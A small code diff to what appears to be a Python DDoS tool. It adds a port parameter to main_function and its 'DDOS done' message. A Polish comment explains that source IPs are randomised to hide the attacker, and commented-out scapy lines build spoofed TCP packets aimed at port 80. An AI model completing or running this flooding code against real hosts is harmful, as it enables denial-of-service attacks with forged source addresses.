@@ -11,7 +11,7 @@ def generate_random_source_ip(): # generacje src ip żeby ze swojego nie atakowa
     address[3]=str(random.randrange(2,254))
     returned_address=address[0]+dot+address[1]+dot+address[2]+dot+address[3]
     return returned_address
-def main_function(targetIp):
+def main_function(targetIp, port):
     # targetip = '192.168.1.165'
 
     # for i in range(1000):
@@ -20,4 +20,4 @@ def main_function(targetIp):
     #     source_port = RandNum(1024, 65535)
     #     packet = IP(src=source_IP, dst=targetip) / TCP(sport=source_port, dport=80)
     #     send(packet)
-    return 'DDOS done; target ip: '+ targetIp
+    return 'DDOS done; target ip: '+ targetIp + " " + port
